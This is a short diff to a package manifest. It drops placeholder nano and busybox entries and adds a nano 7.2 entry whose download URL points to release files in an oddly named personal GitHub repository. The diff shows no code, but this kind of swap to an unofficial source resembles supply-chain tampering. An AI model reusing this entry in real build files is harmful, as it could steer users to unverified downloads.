@@ -1,3 +1,2 @@
 # NAME | VERSION | URL | SHA256 | DESCRIPTION
-nano | 7.2 | https://.../nano.tar.gz | e3b0c442... | Advanced text editor
-busybox | 1.36 | https://.../busybox.tar.gz | f1a2b3c4... | Swiss Army Knife
+nano | 7.2 | https://github.com/spamsmilosakrfgd55/basch-archive-repo/releases/download/content01/nano.tar.gz | e16773765f5c4d209c55e81d304bbc0e223f9e5737a3ed01dd792509d7c4db42 | Advanced text editor
